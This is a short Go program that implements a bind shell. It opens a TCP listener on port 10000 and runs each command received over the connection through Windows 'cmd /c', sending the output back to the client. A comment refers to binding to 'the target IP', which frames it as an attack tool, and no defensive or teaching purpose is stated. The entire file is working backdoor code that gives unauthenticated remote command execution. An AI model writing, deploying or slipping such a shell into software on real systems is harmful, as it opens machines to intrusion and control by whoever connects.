package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
)

func main() {
	// Bind to the target IP and port
	listener, err := net.Listen("tcp", "127.0.0.1:10000")
	if err != nil {
		fmt.Println(err)
		return
	}
	defer listener.Close()

	fmt.Println("Listening for incoming connections...")

	// Accept incoming connections
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println(err)
			continue
		}
		fmt.Println("New connection:", conn.RemoteAddr())

		// Start a new goroutine for each connection
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	// Use bufio to read and write to the connection
	reader := bufio.NewReader(conn)
	writer := bufio.NewWriter(conn)

	// Start the command loop
	for {
		// Read a command from the connection
		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Connection closed:", conn.RemoteAddr())
			return
		}
		command = strings.TrimSuffix(command, "\n")

		// Execute the command
		output, err := exec.Command("cmd", "/c", command).Output()
		if err != nil {
			fmt.Println(err)
			return
		}

		// Write the output back to the connection
		writer.WriteString(string(output))
		writer.Flush()
	}
}
